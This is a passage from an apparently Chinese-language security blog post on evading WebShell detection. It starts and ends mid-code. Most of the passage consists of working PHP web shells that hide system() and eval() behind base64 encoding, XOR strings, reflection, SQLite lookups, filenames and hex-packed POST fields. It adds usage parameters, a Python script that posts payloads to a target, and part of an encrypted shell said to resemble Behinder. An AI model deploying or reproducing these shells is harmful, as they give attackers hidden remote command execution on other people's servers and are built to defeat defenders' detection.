class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$decrpt</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$decrps</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"><span class="variable">$arrs</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$decrpt</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$arrs</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$arrs</span>));</span><br><span class="line"><span class="variable">$arrt</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="variable">$decrps</span>)[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$arrt</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$arrt</span>)); <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$arrs</span>[<span class="number">0</span>],<span class="variable">$arrt</span>[<span class="number">0</span>]);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//a=c3lzdGVt    //system的base64加密</span></span><br><span class="line"><span class="comment">//b=d2hvYW1p    //whoami的base64加密</span></span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"><span class="number">2</span>. 函数构造传参  </span><br><span class="line">可以用一些定义函数的函数来进行传参绕过，比如使用 <span class="title function_ invoke__">register_tick_function</span>() 这个函数  </span><br><span class="line">```php</span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span> ( <span class="keyword">callable</span> <span class="variable">$function</span> [, <span class="keyword">mixed</span> $... ] ) : <span class="keyword">bool</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="keyword">declare</span>(ticks=<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">register_tick_function</span> (<span class="variable">$f</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;aabyss&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">```  </span><br><span class="line"><span class="comment">### 自定义函数绕过  </span></span><br><span class="line"></span><br><span class="line">读取已定义函数  </span><br><span class="line">获取某个类的全部已定义的常量，不管可见性如何定义  </span><br><span class="line">&gt;<span class="keyword">public</span> <span class="title class_">ReflectionClass</span>::<span class="title function_ invoke__">getConstants</span>(<span class="keyword">void</span>) : <span class="keyword">array</span></span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">a</span> = <span class="string">&#x27;Sy&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">b</span> = <span class="string">&#x27;st&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">c</span> = <span class="string">&#x27;em&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$para1</span>;</span><br><span class="line"><span class="variable">$para2</span>;</span><br><span class="line"><span class="variable">$reflector</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;Test&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">97</span>; <span class="variable">$i</span> &lt;= <span class="number">99</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$para1</span> = <span class="variable">$reflector</span>-&gt;<span class="title function_ invoke__">getConstant</span>(<span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>));</span><br><span class="line">    <span class="variable">$para2</span>.=<span class="variable">$para1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="keyword">array</span>(<span class="string">&#x27;_POST&#x27;</span>,<span class="string">&#x27;_GET&#x27;</span>) <span class="keyword">as</span> <span class="variable">$_request</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$$_request</span> <span class="keyword">as</span> <span class="variable">$_key</span>=&gt;<span class="variable">$_value</span>) &#123;</span><br><span class="line">        <span class="variable">$$_key</span>=  <span class="variable">$_value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$para2</span>(<span class="variable">$_value</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="读取字符串绕过"><a href="#读取字符串绕过" class="headerlink" title="读取字符串绕过"></a>读取字符串绕过</h3><p>重点还是放在高危函数上，通过读取各种东西来获得对应字符串  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//读取注释</span></span><br><span class="line"><span class="title class_">ReflectionClass</span>::<span class="variable constant_">getDocComment</span><span class="comment">//这里用到读取注释的函数</span></span><br><span class="line">    <span class="comment">/**   </span></span><br><span class="line"><span class="comment">    * system($_GET[aabyss]);</span></span><br><span class="line"><span class="comment">    */</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123; &#125;  </span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;User&#x27;</span>);</span><br><span class="line"><span class="variable">$comment</span> = <span class="variable">$user</span>-&gt;<span class="title function_ invoke__">getDocComment</span>();</span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$comment</span> , <span class="number">14</span> , <span class="number">22</span>);</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$f</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取数据库</span></span><br><span class="line"><span class="comment">//可以通过 file_put_contents 文件写入函数入一个Sqlite的数据库</span></span><br><span class="line"><span class="variable">$datatest</span> = <span class="string">&quot;[文件的base64编码]&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./要写入的文件名&#x27;</span>, <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$datatest</span>));</span><br><span class="line"><span class="comment">//然后通过PHP读取数据库内容提取高危函数，从而达到WebShell免杀效果</span></span><br><span class="line"><span class="variable">$path</span> = <span class="string">&quot;数据库文件名&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$db</span> = <span class="keyword">new</span> <span class="title function_ invoke__">PDO</span>(<span class="string">&quot;sqlite:&quot;</span> . <span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql_stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;select * from test where name=&quot;system&quot;&#x27;</span>);</span><br><span class="line"><span class="variable">$sql_stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$sql_stmt</span>-&gt;queryString, -<span class="number">7</span>, <span class="number">6</span>);</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//读取目录</span></span><br><span class="line"><span class="comment">//FilesystemIterator 是一个迭代器，可以获取到目标目录下的所有文件信息</span></span><br><span class="line"><span class="keyword">public</span> <span class="title class_">FilesystemIterator</span>::<span class="variable constant_">next</span> ( <span class="keyword">void</span> ) : <span class="keyword">void</span></span><br><span class="line"><span class="comment">//可以尝试使用 file_put_contents 写入一个名为 system.kanye 的空文件，然后遍历目录拿到字符串 system ，成功ByPass</span></span><br><span class="line"><span class="variable">$fi</span> = <span class="keyword">new</span> <span class="built_in">FilesystemIterator</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>));</span><br><span class="line"><span class="variable">$f</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$fi</span> <span class="keyword">as</span> <span class="variable">$i</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$i</span>-&gt;<span class="title function_ invoke__">__toString</span>(), -<span class="number">6</span>,<span class="number">5</span>)==<span class="string">&#x27;kanye&#x27;</span>)  <span class="comment">//判断后缀名为.aabyss的文件（其他特殊后缀也行）</span></span><br><span class="line">        <span class="variable">$f</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$i</span>-&gt;<span class="title function_ invoke__">__toString</span>(), -<span class="number">13</span>,<span class="number">6</span>);      <span class="comment">//从system.kanye提取出system高危函数</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$f</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>]);</span><br><span class="line"><span class="comment">//为什么要写入为 system.kanye 这个文件名呢，因为特殊后缀能让代码快速锁定文件，不至于提取文件名提取到其他文件了</span></span><br></pre></td></tr></table></figure><h3 id="多姿势配合免杀-样例"><a href="#多姿势配合免杀-样例" class="headerlink" title="多姿势配合免杀  (样例)"></a>多姿势配合免杀  (样例)</h3><ol><li><p>重在思路<br>这个样例使用了异或+变换参数的手法，成功规避了正则匹配式，具有实战意义  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>~<span class="variable">$_</span>=<span class="string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="variable">$_</span>&#125;[_](@$&#123;<span class="variable">$_</span>&#125;[__]);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时候，就可以执行GET传参：?_&#x3D;system&amp;__&#x3D;whoami 来执行whoami命令<br>拆开看看  (异或)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>~<span class="variable">$_</span>=<span class="string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;</span><br><span class="line"><span class="comment">//即 &#x27;$&lt;&gt;/&#x27; ^ &#x27;&#123;&#123;&#123;&#123;&#x27;</span></span><br><span class="line"><span class="comment">//即 &quot;$&lt;&gt;/&quot; 这部分字符串与后面 &quot;&#123;&#123;&#123;&#123;&quot; 这部分字符串异或</span></span><br><span class="line"><span class="comment">//_GET</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//所以整个PHP语句解密后，再将 _ 替换为 a，将 __ 替换为 b，则原PHP转化为：</span></span><br><span class="line"><span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])</span><br><span class="line"><span class="comment">//当我们给 a 传 system，给 b 传 whoami，原式就会变成这样</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;whoami&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//assert的(php5)</span></span><br><span class="line"><span class="meta">&lt;?=</span>~<span class="variable">$_</span>=<span class="string">&#x27;$&lt;&gt;/&#x27;</span>^<span class="string">&#x27;&#123;&#123;&#123;&#123;&#x27;</span>;<span class="variable">$___</span>=<span class="string">&#x27;$+4(/&#x27;</span> ^ <span class="string">&#x27;&#123;&#123;&#123;&#123;&#123;&#x27;</span>;@$&#123;<span class="variable">$_</span>&#125;[_](@$&#123;<span class="variable">$___</span>&#125;[__]);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>这个样例使用了字符串截取+编解码转换+参数回调的手法，成功规避了正则匹配式，具有实战意义</p></li></ol><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Car</span></span>&#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$num1</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]);</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$num1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H*&quot;</span>,(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$num</span>,-<span class="variable">$num</span>)));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$post</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Qxi*37yz&#x27;</span>]);</span><br><span class="line">@<span class="variable">$post1</span>=<span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$post</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$post1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encode</span>());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span>=<span class="keyword">new</span> <span class="title class_">Car</span>;</span><br><span class="line"><span class="variable">$t</span>-&gt;<span class="title function_ invoke__">Xt</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//这时候，就可以执行POST传参：num=2&amp;Qxi*37yz=6173797374656d282777686f616d6927293b62 来执行whoami命令</span></span><br><span class="line"><span class="comment">//拆开分析：</span></span><br><span class="line"><span class="comment">//encode()和Xt()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$num1</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]);</span><br><span class="line"><span class="variable">$num</span>=<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$num1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H*&quot;</span>,(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$num</span>,-<span class="variable">$num</span>)));</span><br><span class="line">&#125;</span><br><span class="line">@<span class="variable">$post</span>=<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;Qxi*37yz&#x27;</span>]);</span><br><span class="line">@<span class="variable">$post1</span>=<span class="title function_ invoke__">base64_decode</span>(@<span class="variable">$post</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$post1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//重点在</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="variable">$k</span>] = <span class="title function_ invoke__">pack</span>(<span class="string">&quot;H*&quot;</span>,(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$num</span>,-<span class="variable">$num</span>)));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//解析：</span></span><br><span class="line"><span class="comment">//substr() 函数将传进去的 Qxi*37yz 参数字符串，删掉前 num 个字符和后 num 个字符（截取中间部分的内容）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//pack(&quot;H*&quot;,...) 函数将处理后的 Qxi*37yz 参数字符串进行十六进制编码转换</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//foreach() 将原本的 $_POST 变量替换为经过十六进制编码转换后的字符串</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//再来看看Xt()</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encode</span>());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//它将 encode() 函数的执行结果带入到 eval() 高危函数当中，即：</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Xt</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="keyword">eval</span>(<span class="variable">$post1</span>);  <span class="comment">//encode()函数的输出为$post1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//注意：传system(&#x27;whoami&#x27;);要在前后分别加a，b</span></span><br><span class="line"><span class="comment">//因为substr() 函数啊，会删掉前 num 个字符和后 num 个字符（截取中间部分的内容）</span></span><br></pre></td></tr></table></figure><pre><code>刚开始传入参数：num=2，Qxi*37yz=6173797374656d282777686f616d6927293b62第一步：先根据 substr()，从num=2开始截取到倒数第2位，于是 Qxi*37yz 便等于 73797374656d282777686f616d6927293b第二步：再根据 pack(&quot;H*&quot;,...)，将 Qxi*37yz=73797374656d282777686f616d6927293b 从16进制转为字符串即 system(&#39;whoami&#39;);第三步：最后根据 foreach()，将内容返还给原本的值，使得 encode() 函数的输出变量 $post1 为 system(&#39;whoami&#39;);第四步：再在 Xt() 函数当中，用 eval() 高危函数执行php语句 system(&#39;whoami&#39;);,便成功执行系统命令 whoami</code></pre><p>微信的 @Elvery 师傅还写了一个直接生成Payload一键传参的Python脚本，师傅们可以参考一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># 指定num参数和要执行的PHP代码</span></span><br><span class="line">num = <span class="number">5</span></span><br><span class="line">php_code = <span class="string">&#x27;echo &quot;Hello, world!&quot;;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把PHP代码转换为十六进制字符串</span></span><br><span class="line">hex_code = php_code.encode().<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在字符串的开头和结尾加上num个任意字符</span></span><br><span class="line">encoded_code = <span class="string">&#x27;a&#x27;</span>*num + hex_code + <span class="string">&#x27;a&#x27;</span>*num</span><br><span class="line"></span><br><span class="line"><span class="comment"># 发送POST请求</span></span><br><span class="line">response = requests.post(<span class="string">&#x27;http://your-target-url/path-to-php-file.php&#x27;</span>, data=&#123;</span><br><span class="line">    <span class="string">&#x27;num&#x27;</span>: num,</span><br><span class="line">    <span class="string">&#x27;Qxi*37yz&#x27;</span>: encoded_code,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印服务器的响应</span></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>样例三<br>这个样例使用了异或+编解码转换+参数加解密回调+密钥协商的手法，成功规避了语义分析和正则匹配式，具有实战意义</li></ol><p>这个WebShell和冰蝎马等具有相似性，各位师傅不妨可以看看原理：  </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set_token</span>(<span class="params"><span class="variable">$v</span>,<span class="variable">$t</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$x</span>=<span class="number">0</span>; <span class="variable">$x</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$v</span>);<span class="variable">$x</span>++) &#123;</span><br><span class="line"><span class="keyword">if</span>((<span class="variable">$x</span>+<span class="number">1</span>)%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>)!=<span class="number">0</span>) &#123;</span><br><span class="line"><span class="variable">$r</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$x</span>,<span class="variable">$x</span>+<span class="number">1</span>))^<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>,<span class="variable">$x</span>%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>),(<span class="variable">$x</span>+<span class="number">1</span>) % <span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>))));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="variable">$r</span>.=<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$v</span>,<span class="variable">$x</span>,<span class="variable">$x</span>+<span class="number">1</span>))^<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$t</span>,<span class="variable">$x</span>%<span class="title function_ invoke__">strlen</span>(<span class="variable">$t</span>),<span class="number">16</span>)));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="variable">$r</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;HTTP_TOKEN&quot;</span>])) &#123;</span><br><span class="line"><span class="variable">$t</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()),<span class="number">16</span>);</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable">$t</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Token:&#x27;</span>.<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>])) &#123;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_CSRF_TOKEN&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span>=<span class="string">&#x27;DQHNGW&#x27;</span>^<span class="string">&#x27;&amp;0;+qc&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span>.= <span class="string">&#x27;_dec&#x27;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">111</span>).<span class="string">&#x27;de&#x27;</span>;</span><br><span class="line"><span class="variable">$v</span>=<span class="variable">$b</span>(<span class="variable">$v</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">E</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;</span><br><span class="line"><span class="variable">$c</span>=(<span class="string">&#x27;ZSLQWR&#x27;</span>^<span class="string">&#x27;82?4af&#x27;</span>).<span class="string">&quot;_d&quot;</span>.<span class="string">&quot;eco&quot;</span>.<span class="title function_ invoke__">chr</span>(<span class="number">108</span>-<span class="number">8</span>).<span 